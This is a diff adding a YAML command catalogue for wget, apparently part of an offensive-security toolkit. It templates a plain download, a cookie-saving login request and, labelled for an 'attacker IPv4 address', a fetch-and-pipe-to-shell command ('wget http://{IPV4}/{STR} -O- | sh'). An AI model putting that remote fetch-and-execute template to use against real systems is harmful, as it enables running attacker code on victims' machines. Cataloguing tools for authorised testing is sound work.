@@ -1,0 +1,28 @@
+---
+name: wget
+description: Non-interactive network downloader that supports HTTP, HTTPS, FTP, and HTTP proxies
+os: Linux
+ptf_module: null
+---
+commands:
+  - "Grab URL":
+    - type: ["bash","standalone"]
+    - text: "wget {WEBURL} -O {FILE} -o /dev/null"
+    - input: ["target URL","output file"]
+    - output: ["STDOUT",{"FILE":{"input":2}}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Fetch and Execute Shell Script vis HTTP":
+    - type: ["other","NX"]
+    - text: "wget http://{IPV4}/{STR} -O- | sh"
+    - input: ["attacker IPv4 address","hosted shell script file"]
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Capture Session Token":
+    - type: ["bash","standalone"]
+    - text: "wget -q --save-cookies={FILE} --keep-session-cookies --post-data=\"username:{STR}&password={STR}&Login=Login\" {WEBURL}"
+    - input: ["output cookies file","username","password","target login URL"]
+    - output: ["STDOUT",{"FILE":{"input":1}}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+...
